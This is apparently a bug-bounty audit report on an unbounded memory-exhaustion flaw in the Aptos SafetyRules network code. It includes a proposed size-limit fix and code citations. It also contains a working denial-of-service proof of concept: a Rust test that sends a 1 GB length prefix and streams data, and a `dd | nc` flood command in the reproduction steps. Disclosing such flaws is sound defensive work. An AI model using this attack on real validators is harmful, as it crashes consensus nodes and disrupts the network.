# Audit Report

## Title
Unbounded Memory Exhaustion in SafetyRules Network Communication Leads to Validator Crash

## Summary
The `NetworkStream::read()` function in the secure networking module lacks bounds checking on incoming message sizes, allowing a malicious peer to exhaust validator memory and crash the SafetyRules service, resulting in complete loss of validator liveness.

## Finding Description

The `NetworkStream::read()` function implements a length-prefixed message protocol where messages consist of a 4-byte little-endian length field followed by the payload data. [1](#0-0) 

The vulnerability occurs in the read loop where data is continuously appended to an internal buffer without validating that the claimed message size is reasonable. [2](#0-1) 

The `read_buffer()` function extracts the length prefix and checks if enough data has been received, but performs NO validation that the length value itself is within acceptable bounds. [3](#0-2) 

**Attack Scenario:**

1. A malicious peer connects to the SafetyRules service TCP socket (when configured in Process or Thread mode)
2. The attacker sends 4 bytes representing a very large message size (e.g., `0x00CA9A3B` = 1GB in little-endian, or even `0xFFFFFFFF` = 4GB)
3. The attacker then continuously streams data to the service within the timeout window
4. The buffer grows unbounded as data is appended via `self.buffer.extend()` on each read iteration
5. Eventually, the process exhausts available memory and crashes with OOM

This is used by the SafetyRules remote service, a critical consensus component. [4](#0-3) 

The network server accepts connections and reads messages in a loop, with NO authentication or authorization. [5](#0-4) 

**Asymmetric Protection:**

The write path includes protection against oversized messages. [6](#0-5) 

However, the read path has NO corresponding check, creating an asymmetric vulnerability where incoming malicious messages can bypass size limits.

**Comparison with Main Network Framework:**

The main Aptos network framework defines reasonable message size limits. [7](#0-6) 

The secure/net module completely lacks such protections, despite handling consensus-critical communication.

## Impact Explanation

**Severity: CRITICAL**

This vulnerability meets the "Total loss of liveness/network availability" criterion from the Aptos Bug Bounty program:

1. **SafetyRules Criticality**: SafetyRules is the consensus safety module responsible for ensuring validators never sign conflicting blocks. Its crash completely halts validator participation.

2. **Liveness Impact**: When the SafetyRules service crashes due to memory exhaustion, the validator cannot:
   - Sign block proposals
   - Vote on blocks
   - Participate in quorum formation
   - Sign timeout certificates

3. **Network-Wide Impact**: While mainnet validators are protected by configuration sanitizers that enforce Local mode, testnet and devnet deployments using Process/Thread modes are vulnerable. [8](#0-7) 

4. **No Recovery**: Unlike timeout-based DoS attacks, this causes permanent process termination requiring manual intervention to restart the validator.

## Likelihood Explanation

**Likelihood: MEDIUM-HIGH**

**Ease of Exploitation:**
- Attack complexity is LOW: simply connect to TCP socket and send crafted data
- No authentication required on the SafetyRules network socket
- No special permissions or validator access needed
- Attack can be automated with simple Python/netcat script

**Limiting Factors:**
- Mainnet validators MUST use SafetyRulesService::Local mode (config enforced)
- Only affects validators configured with Process or Thread service modes
- Attacker needs network connectivity to the SafetyRules listening address
- In production, this address should be on a private network, but misconfigurations occur

**Realistic Scenarios:**
- Testnet/devnet validators regularly use Process mode for testing
- Misconfigured validators that bypass config sanitizers
- Development/staging environments
- Validators that expose SafetyRules service on public networks

## Recommendation

Implement maximum message size validation in `NetworkStream::read_buffer()`:

```rust
// Define constant (align with main network framework)
const MAX_MESSAGE_SIZE: usize = 64 * 1024 * 1024; // 64 MiB

fn read_buffer(&mut self) -> Vec<u8> {
    if self.buffer.len() < 4 {
        return Vec::new();
    }

    let mut u32_bytes = [0; 4];
    u32_bytes.copy_from_slice(&self.buffer[..4]);
    let data_size = u32::from_le_bytes(u32_bytes) as usize;

    // ADD THIS CHECK:
    if data_size > MAX_MESSAGE_SIZE {
        // Return error or reset buffer to prevent memory exhaustion
        self.buffer.clear();
        return Vec::new(); // or propagate error
    }

    let remaining_data = &self.buffer[4..];
    if remaining_data.len() < data_size {
        return Vec::new();
    }

    let returnable_data = remaining_data[..data_size].to_vec();
    self.buffer = remaining_data[data_size..].to_vec();
    returnable_data
}
```

Additionally, modify the `read()` function to propagate this as an error:

```rust
pub fn read(&mut self) -> Result<Vec<u8>, Error> {
    // Change read_buffer to return Result<Vec<u8>, Error>
    // Return Error::DataTooLarge when limit exceeded
}
```

## Proof of Concept

```rust
#[test]
fn test_memory_exhaustion_attack() {
    use std::io::Write;
    use std::net::{IpAddr, Ipv4Addr, SocketAddr, TcpStream};
    use std::thread;
    
    // Start SafetyRules service in Process mode
    let server_port = aptos_config::utils::get_available_port();
    let server_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), server_port);
    let mut server = NetworkServer::new("safety-rules".to_string(), server_addr, 30_000);
    
    thread::spawn(move || {
        // Server attempts to read message
        let _ = server.read(); // This will hang/crash with large message
    });
    
    thread::sleep(std::time::Duration::from_millis(100));
    
    // Malicious client connects
    let mut stream = TcpStream::connect(server_addr).unwrap();
    stream.set_nodelay(true).unwrap();
    
    // Send malicious length prefix: 1GB (0x3B9ACA00 in little-endian)
    let malicious_length: u32 = 1_000_000_000;
    stream.write_all(&malicious_length.to_le_bytes()).unwrap();
    
    // Continuously send data to keep connection alive and grow buffer
    let chunk = vec![0u8; 1024 * 1024]; // 1MB chunks
    for _ in 0..1000 {
        stream.write_all(&chunk).unwrap();
        thread::sleep(std::time::Duration::from_millis(10));
    }
    
    // After sending enough data, the server process will OOM crash
    // Expected: Server crashes with memory exhaustion
    // Actual: No bounds checking prevents this attack
}
```

**Steps to Reproduce:**
1. Configure a validator with `SafetyRulesService::Process` mode in testnet
2. Note the SafetyRules service listening address
3. Connect to the address using netcat or custom TCP client
4. Send 4 bytes: `\x00\xca\x9a\x3b` (1GB in little-endian)
5. Stream continuous data (e.g., `dd if=/dev/zero bs=1M | nc <address> <port>`)
6. Monitor validator memory usage - observe unbounded growth
7. Validator SafetyRules process crashes with OOM
8. Validator loses liveness completely

**Notes**

While mainnet validators are protected by configuration enforcement requiring SafetyRulesService::Local mode, this vulnerability still poses a critical risk to:
- All testnet and devnet validators using Process/Thread modes
- Misconfigured validators
- Development and testing environments
- Future architectural changes that might relax the Local-mode requirement

The absence of any message size validation in a consensus-critical networking component represents a fundamental security oversight, especially given that the main network framework implements such protections and even the write path in the same module has size checks.

### Citations

**File:** secure/net/src/lib.rs (L430-451)
```rust
    pub fn read(&mut self) -> Result<Vec<u8>, Error> {
        let result = self.read_buffer();
        if !result.is_empty() {
            return Ok(result);
        }

        loop {
            trace!("Attempting to read from stream");
            let read = self.stream.read(&mut self.temp_buffer)?;
            trace!("Read {} bytes from stream", read);
            if read == 0 {
                return Err(Error::RemoteStreamClosed);
            }
            self.buffer.extend(self.temp_buffer[..read].to_vec());
            let result = self.read_buffer();
            if !result.is_empty() {
                trace!("Found a message in the stream");
                return Ok(result);
            }
            trace!("Did not find a message yet, reading again");
        }
    }
```

**File:** secure/net/src/lib.rs (L459-474)
```rust
    pub fn write(&mut self, data: &[u8]) -> Result<(), Error> {
        let u32_max = u32::MAX as usize;
        if u32_max <= data.len() {
            return Err(Error::DataTooLarge(data.len()));
        }
        let data_len = data.len() as u32;
        trace!("Attempting to write length, {},  to the stream", data_len);
        self.write_all(&data_len.to_le_bytes())?;
        trace!("Attempting to write data, {},  to the stream", data_len);
        self.write_all(data)?;
        trace!(
            "Successfully wrote length, {}, and data to the stream",
            data_len
        );
        Ok(())
    }
```

**File:** secure/net/src/lib.rs (L479-496)
```rust
    fn read_buffer(&mut self) -> Vec<u8> {
        if self.buffer.len() < 4 {
            return Vec::new();
        }

        let mut u32_bytes = [0; 4];
        u32_bytes.copy_from_slice(&self.buffer[..4]);
        let data_size = u32::from_le_bytes(u32_bytes) as usize;

        let remaining_data = &self.buffer[4..];
        if remaining_data.len() < data_size {
            return Vec::new();
        }

        let returnable_data = remaining_data[..data_size].to_vec();
        self.buffer = remaining_data[data_size..].to_vec();
        returnable_data
    }
```

**File:** consensus/safety-rules/src/remote_service.rs (L30-45)
```rust
pub fn execute(storage: PersistentSafetyStorage, listen_addr: SocketAddr, network_timeout_ms: u64) {
    let mut safety_rules = SafetyRules::new(storage, false);
    if let Err(e) = safety_rules.consensus_state() {
        warn!("Unable to print consensus state: {}", e);
    }

    let mut serializer_service = SerializerService::new(safety_rules);
    let mut network_server =
        NetworkServer::new("safety-rules".to_string(), listen_addr, network_timeout_ms);

    loop {
        if let Err(e) = process_one_message(&mut network_server, &mut serializer_service) {
            warn!("Failed to process message: {}", e);
        }
    }
}
```

**File:** consensus/safety-rules/src/remote_service.rs (L47-55)
```rust
fn process_one_message(
    network_server: &mut NetworkServer,
    serializer_service: &mut SerializerService,
) -> Result<(), Error> {
    let request = network_server.read()?;
    let response = serializer_service.handle_message(request)?;
    network_server.write(&response)?;
    Ok(())
}
```

**File:** network/framework/src/constants.rs (L20-21)
```rust
pub const MAX_FRAME_SIZE: usize = 4 * 1024 * 1024; /* 4 MiB */
pub const MAX_MESSAGE_SIZE: usize = 64 * 1024 * 1024; /* 64 MiB */
```

**File:** config/src/config/safety_rules_config.rs (L98-104)
```rust
            // Verify that the safety rules service is set to local for optimal performance
            if chain_id.is_mainnet() && !safety_rules_config.service.is_local() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    format!("The safety rules service should be set to local in mainnet for optimal performance! Given config: {:?}", &safety_rules_config.service)
                ));
            }
```
